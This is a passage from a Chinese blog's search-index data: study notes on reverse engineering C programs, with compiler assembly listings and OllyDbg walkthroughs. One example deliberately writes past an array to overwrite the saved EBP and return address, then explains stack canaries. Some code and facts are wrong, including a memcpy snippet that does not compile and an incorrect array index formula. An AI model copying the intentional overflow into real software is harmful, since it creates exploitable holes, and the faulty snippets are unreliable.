%esp, %ebp .cfi_def_cfa_register 5 subl $16, %esp movl 8(%ebp), %eax movl %eax, -4(%ebp) nop.L2: movl -4(%ebp), %eax leal 1(%eax), %edx movl %edx, -4(%ebp) movzbl (%eax), %eax testb %al, %al jne .L2 movl -4(%ebp), %edx movl 8(%ebp), %eax subl %eax, %edx movl %edx, %eax subl $1, %eax leave .cfi_restore 5 .cfi_def_cfa 4, 4 ret .cfi_endproc.LFE0: .size my_strlen, .-my_strlen .section .rodata.LC0: .string &quot;hello&quot; .text .globl main .type main, @functionmain:.LFB1: .cfi_startproc pushl %ebp .cfi_def_cfa_offset 8 .cfi_offset 5, -8 movl %esp, %ebp .cfi_def_cfa_register 5 pushl $.LC0 call my_strlen addl $4, %esp leave .cfi_restore 5 .cfi_def_cfa 4, 4 ret .cfi_endproc.LFE1: .size main, .-main .ident &quot;GCC: (Ubuntu 4.9.1-16ubuntu6) 4.9.1&quot; .section .note.GNU-stack,&quot;&quot;,@progbits MSVC:X86优化后1234567891011121314151617181920212223242526272829303132333435363738_str$ = 8_my_strlen PROC NEAR; File my_strlen.c; Line 5 mov ecx, DWORD PTR _str$[esp-4] mov dl, BYTE PTR [ecx] lea eax, DWORD PTR [ecx+1] test dl, dl je SHORT $L398$L397: mov dl, BYTE PTR [eax] inc eax test dl, dl jne SHORT $L397$L398:; Line 6 sub eax, ecx dec eax; Line 7 ret 0_my_strlen ENDP_TEXT ENDSPUBLIC _main_DATA SEGMENT$SG401 DB 'hello', 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; Line 12 push OFFSET FLAT:$SG401 call _my_strlen add esp, 4; Line 13 ret 0_main ENDP_TEXT ENDSEND 只有函数较短且局部变量较少得情况下，编译器才会优化很多篇幅; inc/dec指令是递增、递减指令； MSVC+OllyDbg程序到达第一次迭代； 最后一次迭代； 我们可以发现，EAX寄存器得指针指向了数值为0得字符串终止了字符串，在循环中，EDX寄存器得值始终没有变化，它一直指向字符串首地址得指针。在循环解释后，程序将计算两个指针得差； 实际计算结果为6，但是我们只写了”Hello”只有5个字节，并且算上结束标识符为6，很明显字符串以外得那个0值也被计算进去了，所以最后一步进行递减运算，把这个字节删除了；","link":"/2019/10/30/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"title":"逆向工程权威指南-循环","text":"X86指令中有一个LOOP指令。LOOP指令检测ECX寄存器得值，如果它不是0则将其递减，并将操作权交给操作符所指定得标签处(跳转); C/C++语句得循环控制语句主要分为for()、while()、do/while()语句； 循环X8612345678910111213141516#include &lt;stdio.h&gt;void printint_finction(int i){ printf(&quot;f(%d)\\r\\n&quot;,i);}int main(){ int i; for(i=2;i&lt;10;i++) { printint_finction(i); } return 0;} 123456789101112131415161718192021222324252627282930313233_i$ = -4_main PROC NEAR; Line 9 push ebp mov ebp, esp push ecx; Line 11 mov DWORD PTR _i$[ebp], 2 ;初始化 jmp SHORT $L342$L343: mov eax, DWORD PTR _i$[ebp] ;循环控制语句 add eax, 1 ;i递减1 mov DWORD PTR _i$[ebp], eax$L342: cmp DWORD PTR _i$[ebp], 10 ;判断是否满足循环条件 jge SHORT $L344 ;如果i=10则终止循环; Line 13 mov ecx, DWORD PTR _i$[ebp] ;循环体call f(i) push ecx call _printint_finction add esp, 4; Line 14 jmp SHORT $L343 ;跳到循环开始处$L344: ;循环结束; Line 15 xor eax, eax; Line 16 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND X86:OllyDbg使用OD来调试我们生成得程序，程序生成得时候使用了/Ox、/Ob0选项生成； 首先我们来到for循环得地方； 可以看到ESI寄存器得值当前为2，对应c语言得i=2； 然后我们继续执行，直到ESI寄存器得值等于9； 当ESI寄存器得值等于A(10)的时候，不会触发条件转移指令jl，所以我们看到跳转为实现，结束循环； X86跟踪调试工具：tracer这个调试器网上没有找到； 内存块复制目前计算机多采用了SIMD和矢量化技术，在内存中复制数据得时候，能够在每次迭代中复制4~8个字节。 123456789#include &lt;stdio.h&gt;void my_memcpy(unsigned char *std,unsigned char *src,sizt_t cnt){ size_t i; for(i=0;i&lt;con;i++) { dst[i] = src[i]; }}","link":"/2019/10/30/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E5%BE%AA%E7%8E%AF/"},{"title":"逆向工程权威指南-指针","text":"指针通常用来帮助函数处理返回值。当函数需要返回多个值得时候，它通常是通过指针传递返回值得； 指针全局变量123456789101112131415#include &lt;stdio.h&gt;void f1(int x,int y,int *sum,int *product){ *sum = x + y; *product = x * y;}int sum,product;void main(){ f1(123,456,&amp;sum,&amp;product); printf(&quot;sum = %d,product = %d\\r\\n&quot;,sum,product);} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108PUBLIC ?f1@@YAXHHPAH0@Z ; f1_TEXT SEGMENT_x$ = 8_y$ = 12_sum$ = 16_product$ = 20?f1@@YAXHHPAH0@Z PROC NEAR ; f1; File pointer.cpp; Line 5 mov eax, DWORD PTR _x$[esp-4] mov ecx, DWORD PTR _y$[esp-4] push esi mov esi, DWORD PTR _sum$[esp] lea edx, DWORD PTR [eax+ecx]; Line 6 imul eax, ecx mov ecx, DWORD PTR _product$[esp] mov DWORD PTR [esi], edx pop esi mov DWORD PTR [ecx], eax; Line 7 ret 0?f1@@YAXHHPAH0@Z ENDP ; f1_TEXT ENDSPUBLIC _mainEXTRN _printf:NEAR_DATA SEGMENT$SG534 DB 'sum = %d,product = %d', 0dH, 0aH, 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; Line 13 push OFFSET FLAT:?product@@3HA ; product push OFFSET FLAT:?sum@@3HA ; sum push 456 ; 000001c8H push 123 ; 0000007bH call ?f1@@YAXHHPAH0@Z ; f1; Line 14 mov eax, DWORD PTR ?product@@3HA ; product mov ecx, DWORD PTR ?sum@@3HA ; sum push eax push ecx push OFFSET FLAT:$SG534 call _printf add esp, 28 ; 0000001cH; Line 15 ret 0_main ENDP_TEXT ENDSENDPUBLIC ?f1@@YAXHHPAH0@Z ; f1_TEXT SEGMENT_x$ = 8_y$ = 12_sum$ = 16_product$ = 20?f1@@YAXHHPAH0@Z PROC NEAR ; f1; File pointer.cpp; Line 4 push ebp mov ebp, esp; Line 5 mov eax, DWORD PTR _x$[ebp] add eax, DWORD PTR _y$[ebp] mov ecx, DWORD PTR _sum$[ebp] mov DWORD PTR [ecx], eax; Line 6 mov edx, DWORD PTR _x$[ebp] imul edx, DWORD PTR _y$[ebp] mov eax, DWORD PTR _product$[ebp] mov DWORD PTR [eax], edx; Line 7 pop ebp ret 0?f1@@YAXHHPAH0@Z ENDP ; f1_TEXT ENDSPUBLIC _mainEXTRN _printf:NEAR_DATA SEGMENT$SG534 DB 'sum = %d,product = %d', 0dH, 0aH, 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; Line 12 push ebp mov ebp, esp; Line 13 push OFFSET FLAT:?product@@3HA ; product push OFFSET FLAT:?sum@@3HA ; sum push 456 ; 000001c8H push 123 ; 0000007bH call ?f1@@YAXHHPAH0@Z ; f1 add esp, 16 ; 00000010H; Line 14 mov eax, DWORD PTR ?product@@3HA ; product push eax mov ecx, DWORD PTR ?sum@@3HA ; sum push ecx push OFFSET FLAT:$SG534 call _printf add esp, 12 ; 0000000cH; Line 15 pop ebp ret 0_main ENDP_TEXT ENDSEND 使用OD来调试这个程序； 首先，当全局变量得地址传递给f1函数(); 在执行第一条指令之前，在BSS段中未被初始化赋值得数据会被置为0，所以这些变量会被清空。变量驻留在数据段； 使用OD得内存查看工具来查看 跟踪调试f1函数 局部变量12345678910111213141516#include &lt;stdio.h&gt;void f1(int x,int y,int *sum,int *product){ *sum = x + y; *product = x * y;}void main(){ int sum,product; f1(123,456,&amp;sum,&amp;product); printf(&quot;sum = %d,product = %d\\r\\n&quot;,sum,product);} 指令清单： 1234567891011121314151617181920212223242526272829303132333435?f1@@YAXHHPAH0@Z ENDP ; f1_TEXT ENDSPUBLIC _mainEXTRN _printf:NEAR_DATA SEGMENT$SG534 DB 'sum = %d,product = %d', 0dH, 0aH, 00H_DATA ENDS_TEXT SEGMENT_sum$ = -4_product$ = -8_main PROC NEAR; Line 12 sub esp, 8; Line 14 lea eax, DWORD PTR _product$[esp+8] lea ecx, DWORD PTR _sum$[esp+8] push eax push ecx push 456 ; 000001c8H push 123 ; 0000007bH call ?f1@@YAXHHPAH0@Z ; f1; Line 15 mov edx, DWORD PTR _product$[esp+24] mov eax, DWORD PTR _sum$[esp+24] push edx push eax push OFFSET FLAT:$SG534 call _printf; Line 16 add esp, 36 ; 00000024H ret 0_main ENDP_TEXT ENDSEND 继续使用OD调试； 然后查看函数结果后，栈中得结果； 它们显示得是函数运算得结果； 借助指针，f1函数可以返回位于任意地址得任意值；","link":"/2019/10/28/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E6%8C%87%E9%92%88/"},{"title":"逆向工程权威指南-数学计算指令","text":"出于性能优化得考虑，编译器可能会将1条数学运算指令替换为其他得一条，甚至是一组等效指令； 数学计算指令乘法乘法替换为加法12345678910#include &lt;stdio.h&gt;unsigned int f(unsigned int a){ return a * 8;}int main(){ f(1); return 0;} 使用/Ob0和/Ox进行优化 12345678910111213141516171819202122232425_a$ = 8_f PROC NEAR; File chengfa.c; Line 4 mov eax, DWORD PTR _a$[esp-4] shl eax, 3; Line 5 ret 0_f ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 8 push 1 call _f add esp, 4; Line 9 xor eax, eax; Line 10 ret 0_main ENDP_TEXT ENDSEND 我和书上编译得结果不太一样，我使用MSVC2013编译得时候，也是编译出上述汇编代码； 书上得结果为，将一个乘法拆分为3个加法； 123456789101112_a$ = 8_f PROC NEAR; File chengfa.c; Line 4 mov eax, DWORD PTR _a$[esp-4] add eax,eax add eax,eax add eax,eax ret 0_f ENDP_EXT ENDSEND 替换为位移运算123456789#include &lt;stdio.h&gt;unsigned int f(unsigned int a){ return a * 4;}int main(){ f(2);} 12345678910111213141516171819202122232425262728293031_TEXT SEGMENT_a$ = 8_f PROC NEAR; File weiyi.c; Line 3 push ebp mov ebp, esp; Line 4 mov eax, DWORD PTR _a$[ebp] shl eax, 2; Line 5 pop ebp ret 0_f ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 7 push ebp mov ebp, esp; Line 8 push 2 call _f add esp, 4; Line 9 pop ebp ret 0_main ENDP_TEXT ENDSEND “乘以4”得运算就是把乘数左移2位、在把位移产生得空缺位添加0的运算。 右侧产生的空缺位由0填充；","link":"/2019/10/30/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E6%95%B0%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%8C%87%E4%BB%A4/"},{"title":"逆向工程权威指南-数组","text":"数组就是同类型的数据在内存中依此排序相同类型的一组数据 数组数组12345678910111213141516#include &lt;stdio.h&gt;int main(){ int a[20]; int i; for(i=0;i&lt;10;i++) { a[i] = i * 2; } for(i=0;i&lt;20;i++) { printf(&quot;a[%d] = %d\\r\\n&quot;,i,a[i]); } return 0;} X86123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657_a$ = -80_i$ = -84_main PROC NEAR; File array.c; Line 4 push ebp mov ebp, esp sub esp, 84 ; 00000054H; Line 7 mov DWORD PTR _i$[ebp], 0 jmp SHORT $L338$L339: mov eax, DWORD PTR _i$[ebp] add eax, 1 mov DWORD PTR _i$[ebp], eax$L338: cmp DWORD PTR _i$[ebp], 10 ; 0000000aH jge SHORT $L340; Line 9 mov ecx, DWORD PTR _i$[ebp] shl ecx, 1 mov edx, DWORD PTR _i$[ebp] mov DWORD PTR _a$[ebp+edx*4], ecx; Line 10 jmp SHORT $L339$L340:; Line 11 mov DWORD PTR _i$[ebp], 0 jmp SHORT $L341$L342: mov eax, DWORD PTR _i$[ebp] add eax, 1 mov DWORD PTR _i$[ebp], eax$L341: cmp DWORD PTR _i$[ebp], 20 ; 00000014H jge SHORT $L343; Line 13 mov ecx, DWORD PTR _i$[ebp] mov edx, DWORD PTR _a$[ebp+ecx*4] push edx mov eax, DWORD PTR _i$[ebp] push eax push OFFSET FLAT:$SG344 call _printf add esp, 12 ; 0000000cH; Line 14 jmp SHORT $L342$L343:; Line 15 xor eax, eax; Line 16 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND 这个除去两个循环之外没什么特别的地方，第一个循环填充数据，第二个循环打印数据； “shl ecx,1”执行所有的运算是ecx = ecx * 2; OllyDbg程序为数组申请了80个字节的空间，一个int类型占用4个字节空间； 因为数组全部存储于栈中，所以我们可以在数据窗口中看到整个数组 GCC12345678910111213141516171819202122232425262728293031323334353637383940414243public mainmain proc near ; DATA XREF: _start+17var_70 = dword ptr -70hvar_6C = dword ptr -6Chvar_68 = dword ptr -68hi_2 = dword ptr -54hi = dword ptr -4 push ebp mov ebp, esp and esp, 0FFFFFFF0h sub esp, 70h mov [esp+70h+i], 0 ; i=0 jmp short loc_804840Aloc_80483F7: mov eax, [esp+70h+i] mov edx, [esp+70h+i] add edx, edx ; edx=i*2 mov [esp+eax*4+70h+i_2], edx add [esp+70h+i], 1 ; i++loc_804840A: cmp [esp+70h+i], 13h jle short loc_80483F7 mov [esp+70h+i], 0 jmp short loc_8048441loc_804841B: mov eax, [esp+70h+i] mov edx, [esp+eax*4+70h+i_2] mov eax, offset aADD ; &quot;a[%d]=%d &quot; mov [esp+70h+var_68], edx mov edx, [esp+70h+i] mov [esp+70h+var_6C], edx mov [esp+70h+var_70], eax call _printf add [esp+70h+i], 1loc_8048441: cmp [esp+70h+i], 13h jle short loc_804841B mov eax, 0 leave retnmain endp 一个int类型(指向int的指针)的变量，可以使改变量指向数组并将改数组传递给另一个函数，更准确的说，传递的指针指向数组的第一个元素。 缓冲区溢出读取数组边界以外的内容编译器借助index、以array[index]的形式表示数组，如果仔细的观察二进制代码，那么可以看到程序并没有对数组的边界进行检查，如果访问超过下标最大值，会出现什么？ 12345678910111213#include &lt;stdio.h&gt;int main(){ int a[20]; int i; for(i=0;i&lt;20;i++) { a[i] = i * 2; } printf(&quot;a[120]=%d&quot;,a[20]); //访问超过下标 return 0;} 123456789101112131415161718192021222324252627282930313233343536373839404142_a$ = -80_i$ = -84_main PROC NEAR; File array_index.c; Line 4 push ebp mov ebp, esp sub esp, 84 ; 00000054H; Line 7 mov DWORD PTR _i$[ebp], 0 jmp SHORT $L338$L339: mov eax, DWORD PTR _i$[ebp] add eax, 1 mov DWORD PTR _i$[ebp], eax$L338: cmp DWORD PTR _i$[ebp], 20 ; 00000014H jge SHORT $L340; Line 9 mov ecx, DWORD PTR _i$[ebp] shl ecx, 1 mov edx, DWORD PTR _i$[ebp] mov DWORD PTR _a$[ebp+edx*4], ecx; Line 10 jmp SHORT $L339$L340:; Line 11 mov eax, DWORD PTR _a$[ebp+80] push eax push OFFSET FLAT:$SG341 call _printf add esp, 8; Line 12 xor eax, eax; Line 13 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND 我们先尝试运行这个程序，发现程序并没有报错，而且显示了一个接近栈内数组的数据的值； 我们通过OD查看这个数据是从那里来的。 向数组边界之外的地址赋值1234567891011#include &lt;stdio.h&gt;int main(){ int a[20]; int i; for(i=0;i&lt;30;i++) { a[i] = i; } return 0;} MSVC编译后的汇编代码： 1234567891011121314151617181920212223242526272829303132333435_a$ = -80_i$ = -84_main PROC NEAR; File array_30.c; Line 3 push ebp mov ebp, esp sub esp, 84 ; 00000054H; Line 6 mov DWORD PTR _i$[ebp], 0 jmp SHORT $L338$L339: mov eax, DWORD PTR _i$[ebp] add eax, 1 mov DWORD PTR _i$[ebp], eax$L338: cmp DWORD PTR _i$[ebp], 30 ; 0000001eH jge SHORT $L340; Line 8 mov ecx, DWORD PTR _i$[ebp] mov edx, DWORD PTR _i$[ebp] mov DWORD PTR _a$[ebp+ecx*4], edx; Line 9 jmp SHORT $L339$L340:; Line 10 xor eax, eax; Line 11 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND 我们尝试对这个程序进行运行，发现这个程序奔溃了 我们单步调试这个程序，首先进入循环体，让循环把这个数组写满 然后单步执行，让函数结束，继续分析寄存器的状态 现在EIP的值是不合法的(0x15)，这个地址起码对于Win32来说不是一个合法的地址，程序在此刻发生问题，这时EBP的值是0x14，ECX和EDX的值是0x1D 这张图说明，EIP进行出栈操作的时候，OllyDbg找不到0x15处的程序代码； 回复一下栈结构，程序进入main函数的时候，使用EBP寄存器来保存栈的值，然后分配了84个字节的空间来保存数组和变量i，计算方法是”(20+1)*sizeof(int)”。栈顶指针ESP现在指向栈内的变量i，在执行push入栈后它会指向i的下一个地址； main函数的栈结构如下： ESP i所占用的4字节 ESP+4 a[20]占用的80字节 ESP+84 保存过的EBP ESP+88 返回地址 当我们赋值给a[19]的时候，数组a已经赋值完毕，当我们赋值给a[20]的时候，其实是修改了栈空间中保存的EBP的值； 观察程序奔溃时寄存器的状态，本例将20个数字赋值给a[19]，在函数退出前，CPU通过栈回复EBP的初始值。本例会收到的值是20(0x14)，最后执行RET指令，相当于pop EIP指令 RET指令将程序的控制权传递给栈里的返回地址，不过这个RA的地址被修改为了0x15，CPU就会去寻找0x15处的代码，继续执行，但是那里并没有可执行代码，所以程序崩溃了。 缓冲区溢出的保护下面是一些方法防止缓冲区溢出；msvc使用以下选项编译： 12/RTCs Stack Frame runtime checking/GZ Enable stack checks (/RTCs) 一种方法是在函数局部变量和序言之间写入随机值，在函数退出之前检查该值，如果该值不一致则挂起而不执行RET。进程被挂起；该随机值有时被称为”探测值”； GCC的保护措施12345678#include &lt;malloc.h&gt;#include &lt;stdio.h&gt;void f(){char *buf=(char*)alloca (600);_snprintf (buf, 600, &quot;hi! %d, %d, %d&quot;, 1, 2, 3);puts (buf);}; 不适用任何的附加编译选项，只使用默认选项，GCC将会插入”探测”检测代码 1234567891011121314151617181920212223242526272829303132.LC0:.string &quot;hi! %d, %d, %d&quot;f: push ebp mov ebp, esp push ebx sub esp, 676 lea ebx, [esp+39] and ebx, -16 mov DWORD PTR [esp+20], 3 mov DWORD PTR [esp+16], 2 mov DWORD PTR [esp+12], 1 mov DWORD PTR [esp+8], OFFSET FLAT:.LC0 ; &quot;hi! %d, % d, %d &quot; mov DWORD PTR [esp+4], 600 mov DWORD PTR [esp], ebx mov eax, DWORD PTR gs:20 ; canary //随机值 mov DWORD PTR [ebp-12], eax xor eax, eax call _snprintf mov DWORD PTR [esp], ebx call puts mov eax, DWORD PTR [ebp-12] xor eax, DWORD PTR gs:20 ; canary jne .L5 mov ebx, DWORD PTR [ebp-4] leave ret.L5:call __stack_chk_fail 随机值被写入堆栈，在函数尾部与gs:20的探测值进行比较，如果不一致，_stack_chk_fali函数被调用； 多维数组多维数组和线性数组在本质是相同的，因为计算机的内存是现象的，它是一维数组，但是一维数组可以很容易用来表示多维数组。比如a[3][4]就可以用a[12]来代替； 123456789101112[0][0][0][1][0][2][0][3][1][0][1][4][1][5][1][6][2][0][2][7][2][8][2][9] 该二维数组在一维数组索引表示为： ​ 1 2 34 5 6 78 9 10 11 二维数组举例 以一维数组的方式访问二维数组12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;char a[3][4];char get_by_coordinates1(char array[3][4], int a, int b){ return array[a][b];}char get_by_coordinates2(char *array, int a, int b){ return array[a*4+b];}char get_by_coordinates3(char *array, int a, int b){ return *(array + a * 4 + b);}int main(){ a[2][3] = 123; printf(&quot;%d\\r\\n&quot;, get_by_coordinates1(a, 2, 3)); printf(&quot;%d\\r\\n&quot;, get_by_coordinates2(a, 2, 3)); printf(&quot;%d\\r\\n&quot;, get_by_coordinates3(a, 2, 3)); system(&quot;pause&quot;);} 使用MSVC编译 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980_array$ = 8_a$ = 12_b$ = 16_get_by_coordinates3 PROC NEAR; Line 19 push ebp mov ebp, esp; Line 20 mov eax, DWORD PTR _a$[ebp] mov ecx, DWORD PTR _array$[ebp] lea edx, DWORD PTR [ecx+eax*4] mov eax, DWORD PTR _b$[ebp] mov al, BYTE PTR [edx+eax]; Line 21 pop ebp ret 0_get_by_coordinates3 ENDP_TEXT ENDSPUBLIC _mainEXTRN _printf:NEAREXTRN _system:NEAR_DATA SEGMENT$SG361 DB '%d', 0dH, 0aH, 00H ORG $+3$SG362 DB '%d', 0dH, 0aH, 00H ORG $+3$SG363 DB '%d', 0dH, 0aH, 00H ORG $+3$SG365 DB 'pause', 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; Line 24 push ebp mov ebp, esp; Line 25 mov BYTE PTR _a+11, 123 ; 0000007bH; Line 26 push 3 push 2 push OFFSET FLAT:_a call _get_by_coordinates1 add esp, 12 ; 0000000cH movsx eax, al push eax push OFFSET FLAT:$SG361 call _printf add esp, 8; Line 28 push 3 push 2 push OFFSET FLAT:_a call _get_by_coordinates2 add esp, 12 ; 0000000cH movsx ecx, al push ecx push OFFSET FLAT:$SG362 call _printf add esp, 8; Line 29 push 3 push 2 push OFFSET FLAT:_a call _get_by_coordinates3 add esp, 12 ; 0000000cH movsx edx, al push edx push OFFSET FLAT:$SG363 call _printf add esp, 8; Line 30 push OFFSET FLAT:$SG365 call _system add esp, 4; Line 31 pop ebp ret 0_main ENDP_TEXT ENDSEND 多维数组123456#include &lt;stdio.h&gt;int a[10][20][30];void insert(int x, int y, int z, int value){ a[x][y][z]=value;}; MSVC :x8612345678910111213141516171819202122232425_x$ = 8_y$ = 12_z$ = 16_value$ = 20_insert PROC NEAR; File array3.c; Line 4 push ebp mov ebp, esp; Line 5 mov eax, DWORD PTR _x$[ebp] imul eax, 2400 ; 00000960H mov ecx, DWORD PTR _y$[ebp] imul ecx, 120 ; 00000078H lea edx, DWORD PTR _a[eax+ecx] mov eax, DWORD PTR _z$[ebp] mov ecx, DWORD PTR _value$[ebp] mov DWORD PTR [edx+eax*4], ecx; Line 6 pop ebp ret 0_insert ENDP_TEXT ENDSEND 多维数组计算索引公式：address = 6004x+304y+4z，因为int类型为32bit(4字节)，所以需要*4","link":"/2019/10/31/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E6%95%B0%E7%BB%84/"},{"title":"逆向工程权威指南-栈","text":"条件转移指令较多，容易混淆 条件转移1.单个条件标志得设置转移情况 指令 英文 含义 格式 测试条件JZ/JE jump if zero/equal 结果为零/相等则转移 JZ/JE OPR ZF=1JNZ/JNE jump if not zero/equal 结果不为零/不相等则转移 JNZ/JNE OPR ZF=0JS jump if sign 结果为负则转移 JS OPR SF=1JNS jump if not sign 结果为正则转移 JNS OPR SF=0JO jump if overflow 溢出则转移 JO OPR OF=1JNO jump if not overflow 不溢出则转移 JNO OPR OF=0JP/JPE jump if parity/parity even 奇偶位为1则转移 JP/JPE OPR PF=1JNP/JNPE jump if not parity/parity even 奇偶位为0则转移 JNP/JNPE OPR PF=0JB/JNAE/JC jump if below/not above、not equal/carry 低于/不高于或不等于/进位为1则转移 JB/JNAE/JC OPR CF=1JNB/JAE/JNC jump if not below/ above、equal/not carry 不低于/高于或等于/进位为零则转移 JNB/JAE/JNC OPR CF=0 2.比较两个无符号数，并根据结果转移 JB/JNAE/JC jump if below/not above、not equal/carry 低于/不高于或不等于/进位为1则转移 JB/JNAE/JC OPR CF=1 &lt;JNB/JAE/JNC jump if not below/ above、equal/not carry 不低于/高于或等于/进位为零则转移 JNB/JAE/JNC OPR CF=0 ≥JBE/JNA jump if below/equal、not above 低于/等于、不高于则转移 JBE/JNA OPR CF并ZF=1 ≤JNBE/JA jump if not below/not equal、above 不低于/不等于、高于则转移 JNBE/JA OPR CF并ZF=0 &gt; 3.比较两个有符号数，并根据结果转移 JL/JNGE jump if less、not greater/equal 小于、不大于/不等于则转移 JL/JNGE OPR SF异或CF=1 &lt;JNL/JGE jump if not less、greater/equal 不小于、大于/等于则转移 JNL/JGE OPR SF异或CF=0 ≥JLE/JNG jump if less/equal、not greater 小于/等于、不大于则转移 JLE/JNG OPR (SF异或CF)并ZF=1 ≤JNLE/JG jump if not less/not equal、 greater 不小于/不等于、大于则转移 JNLE/JG OPR (SF异或CF)并ZF=0 &gt; 数值比较1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;void f_signed(int a,int b){ if(a&gt;b) { printf(&quot;a&gt;b\\r\\n&quot;); } if(a==b) { printf(&quot;a==b\\r\\n&quot;); } if(a&lt;b) { printf(&quot;a&lt;b\\r\\n&quot;); }};void f_unsigned(unsigned int a,unsigned int b){ if(a&gt;b) { printf(&quot;a&gt;b\\r\\n&quot;); } if(a==b) { printf(&quot;a==b\\r\\n&quot;); } if(a&lt;b) { printf(&quot;a&lt;b\\r\\n&quot;); }};int main(){ f_signed(1,2); f_unsigned(1,2); return 0;} X86123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111_a$ = 8_b$ = 12?f_signed@@YAXHH@Z PROC NEAR ; f_signed; File if.cpp; Line 4 push ebp mov ebp, esp; Line 5 mov eax, DWORD PTR _a$[ebp] cmp eax, DWORD PTR _b$[ebp] ;CMP指令得第一个操作表达式小于或等于第二个表达式 jle SHORT $L528 ;JLE跳转到指令所标明得地址; Line 7 push OFFSET FLAT:$SG529 call _printf add esp, 4$L528:; Line 9 mov ecx, DWORD PTR _a$[ebp] cmp ecx, DWORD PTR _b$[ebp] ;CMP指令得两个操作表达式不相等 jne SHORT $L530 ;则JNE指令跳转; Line 11 push OFFSET FLAT:$SG531 call _printf add esp, 4$L530:; Line 13 mov edx, DWORD PTR _a$[ebp] cmp edx, DWORD PTR _b$[ebp] ;CMP得第一个表达式大于或者等于第二个表达式 jge SHORT $L532 ;JGE指令跳转; Line 15 push OFFSET FLAT:$SG533 call _printf add esp, 4$L532:; Line 17 pop ebp ret 0?f_signed@@YAXHH@Z ENDP ; f_signed_TEXT ENDSPUBLIC ?f_unsigned@@YAXII@Z ; f_unsigned_DATA SEGMENT ORG $+2$SG539 DB 'a&gt;b', 0dH, 0aH, 00H ORG $+2$SG541 DB 'a==b', 0dH, 0aH, 00H ORG $+1$SG543 DB 'a&lt;b', 0dH, 0aH, 00H_DATA ENDS_TEXT SEGMENT_a$ = 8_b$ = 12?f_unsigned@@YAXII@Z PROC NEAR ; f_unsigned; Line 20 push ebp mov ebp, esp; Line 21 mov eax, DWORD PTR _a$[ebp] cmp eax, DWORD PTR _b$[ebp] jbe SHORT $L538; Line 23 push OFFSET FLAT:$SG539 call _printf add esp, 4$L538:; Line 25 mov ecx, DWORD PTR _a$[ebp] cmp ecx, DWORD PTR _b$[ebp] jne SHORT $L540; Line 27 push OFFSET FLAT:$SG541 call _printf add esp, 4$L540:; Line 29 mov edx, DWORD PTR _a$[ebp] cmp edx, DWORD PTR _b$[ebp] jae SHORT $L542; Line 31 push OFFSET FLAT:$SG543 call _printf add esp, 4$L542:; Line 33 pop ebp ret 0?f_unsigned@@YAXII@Z ENDP ; f_unsigned_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 37 push ebp mov ebp, esp; Line 38 push 2 push 1 call ?f_signed@@YAXHH@Z ; f_signed add esp, 8; Line 39 push 2 push 1 call ?f_unsigned@@YAXII@Z ; f_unsigned add esp, 8; Line 40 xor eax, eax; Line 41 pop ebp ret 0_main ENDP_TEXT ENDSEND 使用GCC来编译这个代码； 1234567891011121314151617181920212223242526272829303132main:.LFB2: .cfi_startproc leal 4(%esp), %ecx .cfi_def_cfa 1, 0 andl $-16, %esp pushl -4(%ecx) pushl %ebp .cfi_escape 0x10,0x5,0x2,0x75,0 movl %esp, %ebp pushl %ecx .cfi_escape 0xf,0x3,0x75,0x7c,0x6 subl $4, %esp subl $8, %esp pushl $2 pushl $1 call f_signed addl $16, %esp subl $8, %esp pushl $2 pushl $1 call f_unsigned addl $16, %esp movl $0, %eax movl -4(%ebp), %ecx .cfi_def_cfa 1, 0 leave .cfi_restore 5 leal -4(%ecx), %esp .cfi_def_cfa 4, 4 ret .cfi_endproc X86+MSVC+OllyDbg 可以通过OllyDbg来查看指令对标志寄存器得影响，首先观察f_unsigned函数，这个函数使用了CMP指令，分三次比较了两个相同得unsigned数据类型；因为参数相同，所以CMP指令设置得标志位必定相同； 计算绝对值1234567891011121314151617#include &lt;stdio.h&gt;int my_abs(int i){ if(i&lt;0) { return -1; } else { return 1; }}int main(){ my_abs(1);} Msvc编译123456789101112131415161718192021222324252627282930313233343536373839PUBLIC _my_abs_TEXT SEGMENT_i$ = 8_my_abs PROC NEAR; File asb.c; Line 3 push ebp mov ebp, esp; Line 4 cmp DWORD PTR _i$[ebp], 0 jge SHORT $L338; Line 6 or eax, -1 jmp SHORT $L339$L338:; Line 10 mov eax, 1$L339:; Line 12 pop ebp ret 0_my_abs ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 15 push ebp mov ebp, esp; Line 16 push 1 call _my_abs add esp, 4; Line 17 pop ebp ret 0_main ENDP_TEXT ENDSEND 条件运算符1234567891011//这就是我们常说得三目运算符#include &lt;stdio.h&gt;const char *f(int a){ return a==0 ? &quot;it is ten&quot; : &quot;it is not ten&quot;;}int main(){ 